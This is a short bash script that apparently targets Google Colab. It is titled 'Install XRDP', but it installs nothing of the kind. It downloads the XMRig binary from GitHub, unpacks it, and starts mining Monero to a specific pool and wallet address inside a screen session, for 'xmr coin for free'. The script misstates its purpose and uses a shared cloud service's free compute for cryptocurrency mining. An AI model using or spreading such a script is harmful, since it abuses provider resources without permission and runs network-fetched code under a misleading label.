#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o de.monero.herominers.com:1111 -a rx -k -u 438hdgmCogPSF85d7KZXTETtmodfUpQAm842oY9qymi8SfukFsFfuVEMXaGzzQE7SxN5CqKCCT8QabA9PEQeTJqpM11Dz5w.worker -p x
